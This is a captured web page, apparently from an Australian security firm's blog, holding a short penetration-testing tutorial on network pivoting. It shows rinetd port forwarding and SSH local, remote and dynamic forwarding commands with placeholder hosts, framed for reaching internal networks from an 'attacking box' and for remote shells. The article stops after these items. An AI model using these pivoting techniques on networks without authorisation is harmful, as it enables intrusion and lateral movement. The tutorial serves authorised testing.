@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="pingback" href="https://catharsis.net.au/blog/xmlrpc.php">
+
+<title>Network Pivoting and Tunneling Guide &#8211; Catharsis | Blog</title>
+            <script type="text/javascript" id="wpuf-language-script">
+                var error_str_obj = {
+                    'required' : 'is required',
+                    'mismatch' : 'does not match',
+                    'validation' : 'is not valid'
+                }
+            </script>
+            <link rel='dns-prefetch' href='//www.googletagmanager.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
+<link rel="alternate" type="application/rss+xml" title="Catharsis | Blog &raquo; Feed" href="https://catharsis.net.au/blog/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Catharsis | Blog &raquo; Comments Feed" href="https://catharsis.net.au/blog/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Catharsis | Blog &raquo; Network Pivoting and Tunneling Guide Comments Feed" href="https://catharsis.net.au/blog/network-pivoting-and-tunneling-guide/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/catharsis.net.au\/blog\/wp-includes\/js\/wp-emoji-release.min.js?ver=fcf166dc002c474f6e98e68812577e9b"}};
+			!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='https://catharsis.net.au/blog/wp-includes/css/dist/block-library/style.min.css?ver=fcf166dc002c474f6e98e68812577e9b' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-block-library-theme-css'  href='https://catharsis.net.au/blog/wp-includes/css/dist/block-library/theme.min.css?ver=fcf166dc002c474f6e98e68812577e9b' type='text/css' media='all' />
+<link rel='stylesheet' id='mundana-styles-css'  href='https://catharsis.net.au/blog/wp-content/themes/mundana/assets/css/theme.min.css?ver=1.1.7.1602108845' type='text/css' media='all' />
+<link rel='stylesheet' id='claps-applause-css'  href='https://catharsis.net.au/blog/wp-content/plugins/wp-claps-applause/css/claps-applause.css?ver=fcf166dc002c474f6e98e68812577e9b' type='text/css' media='all' />
+<link rel='stylesheet' id='wpuf-css-css'  href='https://catharsis.net.au/blog/wp-content/plugins/wp-user-frontend/assets/css/frontend-forms.css?ver=fcf166dc002c474f6e98e68812577e9b' type='text/css' media='all' />
+<link rel='stylesheet' id='jquery-ui-css'  href='https://catharsis.net.au/blog/wp-content/plugins/wp-user-frontend/assets/css/jquery-ui-1.9.1.custom.css?ver=fcf166dc002c474f6e98e68812577e9b' type='text/css' media='all' />
+<link rel='stylesheet' id='wpuf-sweetalert2-css'  href='https://catharsis.net.au/blog/wp-content/plugins/wp-user-frontend/assets/vendor/sweetalert2/dist/sweetalert2.css?ver=3.5.3' type='text/css' media='all' />
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp' id='jquery-core-js'></script>
+<script type='text/javascript' id='wpuf-ajax-script-js-extra'>
+/* <![CDATA[ */
+var ajax_object = {"ajaxurl":"https:\/\/catharsis.net.au\/blog\/wp-admin\/admin-ajax.php","fill_notice":"Some Required Fields are not filled!"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-content/plugins/wp-user-frontend/assets/js/billing-address.js?ver=fcf166dc002c474f6e98e68812577e9b' id='wpuf-ajax-script-js'></script>
+<script type='text/javascript' src='https://www.googletagmanager.com/gtag/js?id=UA-163580946-1' id='google_gtagjs-js' async></script>
+<script type='text/javascript' id='google_gtagjs-js-after'>
+window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('set', 'developer_id.dZTNiMT', true);
+gtag('config', 'UA-163580946-1', {"anonymize_ip":true} );
+</script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4' id='jquery-ui-core-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/jquery/ui/datepicker.min.js?ver=1.11.4' id='jquery-ui-datepicker-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4' id='jquery-ui-widget-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4' id='jquery-ui-mouse-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/plupload/moxie.min.js?ver=1.3.5' id='moxiejs-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/plupload/plupload.min.js?ver=2.1.9' id='plupload-js'></script>
+<script type='text/javascript' id='plupload-handlers-js-extra'>
+/* <![CDATA[ */
+var pluploadL10n = {"queue_limit_exceeded":"You have attempted to queue too many files.","file_exceeds_size_limit":"%s exceeds the maximum upload size for this site.","zero_byte_file":"This file is empty. Please try another.","invalid_filetype":"Sorry, this file type is not permitted for security reasons.","not_an_image":"This file is not an image. Please try another.","image_memory_exceeded":"Memory exceeded. Please try another smaller file.","image_dimensions_exceeded":"This is larger than the maximum size. Please try another.","default_error":"An error occurred in the upload. Please try again later.","missing_upload_url":"There was a configuration error. Please contact the server administrator.","upload_limit_exceeded":"You may only upload 1 file.","http_error":"Unexpected response from the server. The file may have been uploaded successfully. Check in the Media Library or reload the page.","http_error_image":"Post-processing of the image failed likely because the server is busy or does not have enough resources. Uploading a smaller image may help. Suggested maximum size is 2500 pixels.","upload_failed":"Upload failed.","big_upload_failed":"Please try uploading this file with the %1$sbrowser uploader%2$s.","big_upload_queued":"%s exceeds the maximum upload size for the multi-file uploader when used in your browser.","io_error":"IO error.","security_error":"Security error.","file_cancelled":"File canceled.","upload_stopped":"Upload stopped.","dismiss":"Dismiss","crunching":"Crunching\u2026","deleted":"moved to the Trash.","error_uploading":"\u201c%s\u201d has failed to upload.","unsupported_image":"This image cannot be displayed in a web browser. For best results convert it to JPEG before uploading."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/plupload/handlers.min.js?ver=fcf166dc002c474f6e98e68812577e9b' id='plupload-handlers-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-content/plugins/wp-user-frontend/assets/js/jquery-ui-timepicker-addon.js?ver=fcf166dc002c474f6e98e68812577e9b' id='jquery-ui-timepicker-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-includes/js/jquery/ui/sortable.min.js?ver=1.11.4' id='jquery-ui-sortable-js'></script>
+<script type='text/javascript' id='wpuf-upload-js-extra'>
+/* <![CDATA[ */
+var wpuf_frontend_upload = {"confirmMsg":"Are you sure?","delete_it":"Yes, delete it","cancel_it":"No, cancel it","nonce":"207da4bedc","ajaxurl":"https:\/\/catharsis.net.au\/blog\/wp-admin\/admin-ajax.php","max_filesize":"2M","plupload":{"url":"https:\/\/catharsis.net.au\/blog\/wp-admin\/admin-ajax.php?nonce=742eab17d3","flash_swf_url":"https:\/\/catharsis.net.au\/blog\/wp-includes\/js\/plupload\/plupload.flash.swf","filters":[{"title":"Allowed Files","extensions":"*"}],"multipart":true,"urlstream_upload":true,"warning":"Maximum number of files reached!","size_error":"The file you have uploaded exceeds the file size limit. Please try again.","type_error":"You have uploaded an incorrect file type. Please try again."}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-content/plugins/wp-user-frontend/assets/js/upload.js?ver=fcf166dc002c474f6e98e68812577e9b' id='wpuf-upload-js'></script>
+<script type='text/javascript' id='wpuf-form-js-extra'>
+/* <![CDATA[ */
+var wpuf_frontend = {"ajaxurl":"https:\/\/catharsis.net.au\/blog\/wp-admin\/admin-ajax.php","error_message":"Please fix the errors to proceed","nonce":"207da4bedc","word_limit":"Word limit reached","cancelSubMsg":"Are you sure you want to cancel your current subscription ?","delete_it":"Yes","cancel_it":"No"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-content/plugins/wp-user-frontend/assets/js/frontend-form.min.js?ver=fcf166dc002c474f6e98e68812577e9b' id='wpuf-form-js'></script>
+<script type='text/javascript' src='https://catharsis.net.au/blog/wp-content/plugins/wp-user-frontend/assets/vendor/sweetalert2/dist/sweetalert2.js?ver=3.5.3' id='wpuf-sweetalert2-js'></script>
+<link rel="https://api.w.org/" href="https://catharsis.net.au/blog/wp-json/" /><link rel="alternate" type="application/json" href="https://catharsis.net.au/blog/wp-json/wp/v2/posts/948" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://catharsis.net.au/blog/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://catharsis.net.au/blog/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Basic Buffer Overflow Guide' href='https://catharsis.net.au/blog/basic-buffer-overflow-guide/' />
+
+<link rel="canonical" href="https://catharsis.net.au/blog/network-pivoting-and-tunneling-guide/" />
+<link rel='shortlink' href='https://catharsis.net.au/blog/?p=948' />
+<link rel="alternate" type="application/json+oembed" href="https://catharsis.net.au/blog/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcatharsis.net.au%2Fblog%2Fnetwork-pivoting-and-tunneling-guide%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://catharsis.net.au/blog/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcatharsis.net.au%2Fblog%2Fnetwork-pivoting-and-tunneling-guide%2F&#038;format=xml" />
+<meta name="generator" content="Site Kit by Google 1.19.0" />        <style>
+
+        </style>
+        <meta name="google-site-verification" content="WduhcQEvyL1gJ7RaB1QgJGaETPDxIVhoTO7Y20ZQIMU"><link rel="icon" href="https://catharsis.net.au/blog/wp-content/uploads/2019/01/cropped-cropped-logo_black-1-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://catharsis.net.au/blog/wp-content/uploads/2019/01/cropped-cropped-logo_black-1-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://catharsis.net.au/blog/wp-content/uploads/2019/01/cropped-cropped-logo_black-1-180x180.png" />
+<meta name="msapplication-TileImage" content="https://catharsis.net.au/blog/wp-content/uploads/2019/01/cropped-cropped-logo_black-1-270x270.png" />
+<style id="kirki-inline-styles">.mediumnavigation{background-color:#ffffff;}a, a:hover{color:#03a87c;}#comments a{color:#03a87c;}.comment-form input.submit, .lrm-form button, .lrm-form button[type=submit]{background-color:#03a87c;}.comment-form input.submit{border-color:#03a87c;}input[type="submit"], button, .btn-outline-success:hover{background-color:#03a87c;}.btn-outline-success, .btn-outline-success:hover{border-color:#03a87c;}.btn-outline-success{color:#03a87c;}.introjumbo.bglight{background-color:#e8f3ec;}.introjumbo.bglight, .introjumbo .secondfont{color:#222222;}footer.footer a{color:#1C9963;}body{font-size:1rem;line-height:1.6;color:#222222;}b, strong, .font-weight-bold, h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6{color:#222222;}.navbar-brand{font-size:1.65rem;letter-spacing:0px;color:#222222;}.nav-link,.dropdown-item{font-size:0.9rem;letter-spacing:0.1px;text-transform:uppercase;}.article-headline{font-family:Georgia;font-size:3.2rem;font-weight:400;line-height:1.15;color:#222222;}.article-post, #comments .comment-content{font-family:Lora;font-size:1.25rem;font-weight:400;line-height:1.72;color:#444444;}.article-post b, .article-post strong{font-family:Lora;font-weight:700;color:#222222;}.article-post em, .article-post blockquote{font-family:Lora;font-weight:400;font-style:italic;color:#222222;}.introjumbo h1{font-family:Georgia;font-size:2.4rem;font-weight:700;line-height:1.1;}.thesidebar .spanborder.h4{font-size:1.5em;}.widget-area .mc4wp-form{background-color:#e8f3ec;}.widget-area .mc4wp-form input[type="submit"]{background-color:#03a87c;}.widget-area .mc4wp-form, .mc4wp-form-fields h1, .mc4wp-form-fields h2, .mc4wp-form-fields h3, .mc4wp-form-fields h4, .mc4wp-form-fields h5, .mc4wp-form-fields h6{color:#222222;}@media (max-width: 1280px){.container{max-width:1070px;}}/* cyrillic-ext */
+@font-face {
+  font-family: 'Lora';
+  font-style: italic;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI8MX1D_JOuMw_hLdO6T2wV9KnW-MoFoqJ2mvWc3ZyhTjcV.woff) format('woff');
+  unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+}
+/* cyrillic */
+@font-face {
+  font-family: 'Lora';
+  font-style: italic;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI8MX1D_JOuMw_hLdO6T2wV9KnW-MoFoqt2mvWc3ZyhTjcV.woff) format('woff');
+  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+}
+/* vietnamese */
+@font-face {
+  font-family: 'Lora';
+  font-style: italic;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI8MX1D_JOuMw_hLdO6T2wV9KnW-MoFoqB2mvWc3ZyhTjcV.woff) format('woff');
+  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Lora';
+  font-style: italic;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI8MX1D_JOuMw_hLdO6T2wV9KnW-MoFoqF2mvWc3ZyhTjcV.woff) format('woff');
+  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Lora';
+  font-style: italic;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI8MX1D_JOuMw_hLdO6T2wV9KnW-MoFoq92mvWc3ZyhTg.woff) format('woff');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* cyrillic-ext */
+@font-face {
+  font-family: 'Lora';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI6MX1D_JOuGQbT0gvTJPa787weuxJMkqt8ndeYxZ2JTg.woff) format('woff');
+  unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+}
+/* cyrillic */
+@font-face {
+  font-family: 'Lora';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI6MX1D_JOuGQbT0gvTJPa787weuxJFkqt8ndeYxZ2JTg.woff) format('woff');
+  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+}
+/* vietnamese */
+@font-face {
+  font-family: 'Lora';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI6MX1D_JOuGQbT0gvTJPa787weuxJOkqt8ndeYxZ2JTg.woff) format('woff');
+  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Lora';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI6MX1D_JOuGQbT0gvTJPa787weuxJPkqt8ndeYxZ2JTg.woff) format('woff');
+  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Lora';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI6MX1D_JOuGQbT0gvTJPa787weuxJBkqt8ndeYxZ0.woff) format('woff');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* cyrillic-ext */
+@font-face {
+  font-family: 'Lora';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI6MX1D_JOuGQbT0gvTJPa787z5vBJMkqt8ndeYxZ2JTg.woff) format('woff');
+  unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+}
+/* cyrillic */
+@font-face {
+  font-family: 'Lora';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI6MX1D_JOuGQbT0gvTJPa787z5vBJFkqt8ndeYxZ2JTg.woff) format('woff');
+  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+}
+/* vietnamese */
+@font-face {
+  font-family: 'Lora';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI6MX1D_JOuGQbT0gvTJPa787z5vBJOkqt8ndeYxZ2JTg.woff) format('woff');
+  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Lora';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI6MX1D_JOuGQbT0gvTJPa787z5vBJPkqt8ndeYxZ2JTg.woff) format('woff');
+  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Lora';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url(https://catharsis.net.au/blog/wp-content/fonts/lora/0QI6MX1D_JOuGQbT0gvTJPa787z5vBJBkqt8ndeYxZ0.woff) format('woff');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}</style></head> 
+    
+<body class="post-template-default single single-post postid-948 single-format-standard"> 
+        
+
+    
+           
+<header id="MagicMenu" class="navbar-light fixed-top navbar mediumnavigation">
+
+    
+<div class="container">
+       
+        <div class="d-lg-flex justify-content-between align-items-center brandrow w-100">
+            
+            <!-- Begin Logo --> 
+            <div class="logoarea">
+                                     <a class="blog-logo" href='https://catharsis.net.au/blog/' rel='home'><img src='https://catharsis.net.au/blog/wp-content/uploads/2019/01/catharsis_au.jpg' alt='Catharsis | Blog'></a>
+                                </div>
+            <!-- End Logo --> 
+            
+            
+        
+            <!-- Secondary Top Menu -->
+            
+                <div class="navbar-expand-lg  d-lg-flex align-items-center text-lg-right">
+                    
+                <button class="navbar-toggler navbar-toggler-right collapsed" type="button" data-toggle="collapse" data-target="#bs4navbar,#bs4navbartop" aria-controls="bs4navbar" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="menuclose">X</span>
+                <span class="navbar-toggler-icon"></span>
+                </button>
+                    
+                 
+                    
+                <div id="bs4navbartop" class="collapse navbar-collapse"><ul id="menu-main-menu" class="navbar-nav w-100 d-lg-flex align-items-center"><li class="menu-item search align-self-center"><form action="https://catharsis.net.au/blog/" class="search-form" autocomplete="off">
+				<div class="form-group has-feedback">
+						<input type="hidden" name="post_type" value="post" />
+						<input type="text" class="form-control" name="s" placeholder="Type and hit enter...">
+						<i class="fa fa-search form-control-feedback"></i>
+				</div>
+		</form></li><li id="menu-item-846" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-846 nav-item"><a href="https://catharsis.net.au" class="nav-link">Home</a></li>
+<li id="menu-item-847" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-847 nav-item dropdown"><a href="https://catharsis.net.au" class="nav-link dropdown-toggle" data-toggle="dropdown">Services</a>
+<div class="dropdown-menu">
+<a href="https://catharsis.net.au/managed-security/" class=" dropdown-item">Managed Security</a><a href="https://catharsis.net.au/pentesting-services/" class=" dropdown-item">Pentesting Services</a><a href="https://catharsis.net.au/cloud-security/" class=" dropdown-item">Cloud Security</a></div>
+</li>
+<li id="menu-item-851" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-851 nav-item"><a href="https://catharsis.net.au/about-us/" class="nav-link">About Us</a></li>
+<li id="menu-item-866" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-866 nav-item"><a href="https://catharsis.net.au/contact-us/" class="nav-link">Contact Us</a></li>
+<li id="menu-item-852" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-852 nav-item"><a href="https://catharsis.net.au/blog" class="nav-link">Blog</a></li>
+<li id="menu-item-853" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-853 nav-item"><a href="https://wisp.screenconnect.com/" class="nav-link">Remote Support</a></li>
+</ul></div>      
+                    
+                </div>
+             
+            <!-- Secondary Top Menu -->
+                    
+        </div>
+        
+    
+        <!-- Main Menu -->
+        <div class="navbar-expand-lg d-flex  align-items-center w-100">      
+            
+            <div id="bs4navbar" class="collapse navbar-collapse"><ul id="menu-top-menu" class="navbar-nav w-100 d-flex align-items-center justify-content-between"><li id="menu-item-813" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-813 nav-item"><a href="https://catharsis.net.au/" class="nav-link">Home</a></li>
+<li id="menu-item-878" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-878 nav-item"><a href="https://catharsis.net.au/blog/category/latest-news/" class="nav-link">Latest News</a></li>
+<li id="menu-item-876" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-876 nav-item"><a href="https://catharsis.net.au/blog/category/awareness/" class="nav-link">General Awareness</a></li>
+<li id="menu-item-877" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-877 nav-item"><a href="https://catharsis.net.au/blog/category/cve-exploits/" class="nav-link">CVE &amp; Exploits</a></li>
+<li id="menu-item-879" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-879 nav-item"><a href="https://catharsis.net.au/blog/category/how-to/" class="nav-link">How to</a></li>
+<li id="menu-item-880" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-880 nav-item"><a href="https://catharsis.net.au/blog/category/walkthroughs/" class="nav-link">Walkthroughs</a></li>
+</ul></div>       
+        </div>
+        <!-- Main Menu -->
+        
+            
+    </div>
+
+</header>
+    
+       
+<!-- Begin site-content
+================================================== -->
+    
+<div class="container site-content"> 
+   
+
+
+
+<div id="post-948">
+
+    <div class="articleheader jumbotron jumbotron-fluid removetoppadding mb-0 pl-0 pt-0 pb-0 pr-0 bg-transparent position-relative">
+   <div class="h-100 tofront">
+      <div class="d-md-flex justify-content-center justify-content-between">
+         <div class="pt-4 pb-4 pt-md-5 pb-md-5 pr-md-5 align-self-center">
+            
+<p class="text-uppercase font-weight-bold articleheader-category">
+   <a href="https://catharsis.net.au/blog/category/how-to/" rel="category tag">How to</a></p>
+          
+            <h1 class="display-4 article-headline mb-3">Network Pivoting and Tunneling Guide</h1>
+                        <p class="mb-3 text-muted d-none d-md-block">This is for pure educational &amp; informational purpose. Only use these techniques where allowed or you have permission to do so. Power...</p>
+                        
+<div class="d-flex align-items-center">
+        <a class="mr-3" href="https://catharsis.net.au/blog/author/sajal-jain/">
+        <img alt='' src='https://catharsis.net.au/blog/wp-content/uploads/2019/01/Sajal-copy-60x60.jpg' srcset='https://catharsis.net.au/blog/wp-content/uploads/2019/01/Sajal-copy-120x120.jpg 2x' class='avatar avatar-60 photo rounded-circle imgavt' height='60' width='60' loading='lazy'/>    </a>    <small>
+        <a class="text-muted mb-2" href="https://catharsis.net.au/blog/author/sajal-jain/">Written by <span class="text-capitalize">Sajal Jain</span></a>
+                        <span class="text-muted d-block">
+                        <span class="post-date">
+                <time class="post-date">
+                    Oct 22                </time></span> &middot;
+                                    <span class="readingtime">2 min read</span>
+                        <svg style="fill: rgba(0,0,0,0.45); margin-left: 3px; margin-top: -2px; display: inline-block;" xmlns="http://www.w3.org/2000/svg" width="11" height="11" viewBox="0 0 24 24" data-toggle="tooltip" data-placement="top" title="" data-original-title="Updated Oct 22, 2020">>
+    <path d="M12 .288l2.833 8.718h9.167l-7.417 5.389 2.833 8.718-7.416-5.388-7.417 5.388 2.833-8.718-7.416-5.389h9.167z" /></svg>
+        </span>
+    </small>
+</div>          
+         </div>
+         <div class="col-12 col-md-6 pr-0 pl-0 align-self-center text-right">
+            <img width="400" height="356" src="https://catharsis.net.au/blog/wp-content/uploads/2020/10/3193343549_e869a72e52_w.jpg" class="featured-image rounded img-fluid cardwithshadow onhoverup wp-post-image" alt="" loading="lazy" srcset="https://catharsis.net.au/blog/wp-content/uploads/2020/10/3193343549_e869a72e52_w.jpg 400w, https://catharsis.net.au/blog/wp-content/uploads/2020/10/3193343549_e869a72e52_w-300x267.jpg 300w" sizes="(max-width: 400px) 100vw, 400px" />         </div>          
+      </div>           
+   </div>
+</div>
+    <div class="alignfullincol">
+
+        <div class="container-fluid max1140">
+
+            <!-- row -->
+            <div class="row mb-5 mt-5">
+
+                <!-- main column -->
+                <div class="col-md-8">
+
+                    <!-- unless featured image is hidden or not present -->
+                                        <!-- end unless featured image hidden or not present -->
+
+                    <!-- widget before article -->
+                                        <!-- end widget before article -->
+
+                    <article class="article-post">
+                        
+<p class="has-background" style="background-color:#a0eecf">This is for pure educational &amp; informational purpose. Only use these techniques where allowed or you have permission to do so. Power comes with great responsibility.</p>
+
+
+
+<ul><li>Port Forwarding &#8211; accept traffic on a given IP address and port and redirect it to a different IP address and port</li></ul>
+
+
+
+<pre class="wp-block-code"><code>apt-get install rinetd
+cat /etc/rinetd.conf # bindadress bindport connectaddress connectport w.x.y.z 53 a.b.c.d 80</code></pre>
+
+
+
+<ul><li>SSH Local Port Forwarding: supports bi-directional communication channels</li></ul>
+
+
+
+<pre class="wp-block-code"><code>ssh &lt;gateway> -L &lt;local port to listen>:&lt;remote host>:&lt;remote port></code></pre>
+
+
+
+<ul><li>SSH Remote Port Forwarding: Suitable for popping a remote shell on an internal non routable network</li></ul>
+
+
+
+<pre class="wp-block-code"><code>ssh &lt;gateway> -R &lt;remote port to bind>:&lt;local host>:&lt;local port></code></pre>
+
+
+
+<ul><li>SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local attacking box to tunnel ALL incoming traffic to ANY host in the DMZ network on ANY PORT</li></ul>
+
+
+
+<pre class="wp-block-code"><code>ssh -D &lt;local proxy port> -p &lt;remote port> &lt;target></code></pre>
+
+
+
